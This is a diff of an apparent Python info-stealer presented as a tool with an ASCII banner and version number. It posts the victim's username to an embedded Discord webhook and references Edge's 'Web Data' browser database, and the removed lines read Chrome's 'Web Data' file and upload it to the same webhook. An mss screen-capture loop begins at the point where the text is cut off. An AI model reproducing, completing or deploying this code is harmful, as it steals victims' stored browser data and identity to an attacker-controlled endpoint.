@@ -22,14 +22,7 @@ dark_red = "\033[0;31m"
 s= os.popen("whoami").read().strip()
 
 hello = "https://discord.com/api/webhooks/1429030702090948650/wVnXAoK2s1n7dmVc7fHIhstWAjkox-3s9ZYO9GN47bZTYAdSw2s6pqgnGTol15Lzi_CR"
-look = os.path.join(os.environ['LOCALAPPDATA'], 'Google\\Chrome\\User Data\\Default\\Web Data')
 hey = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft\\Edge\\User Data\\Default\\Web Data')
-
-with open(f'{look}', 'rb') as file:
-    r = file.read()
-    f = {
-    "chrome": r}
-    requests.post(hello,files=f)
     see = {
         "content": s
     }
@@ -51,7 +44,7 @@ def main():
 {gray}╚██████╔╝██║  ██║╚██████╗
 {gray} ╚═════╝ ╚═╝  ╚═╝ ╚═════╝""")
  print(f"""{gray}By LEVI &{red}& LONELY""")
- print(f"\033[0m{red}UPDATE {gray}#5.3")
+ print(f"\033[0m{red}UPDATE {gray}#5.4")
 
  with mss() as ss:
      while True:
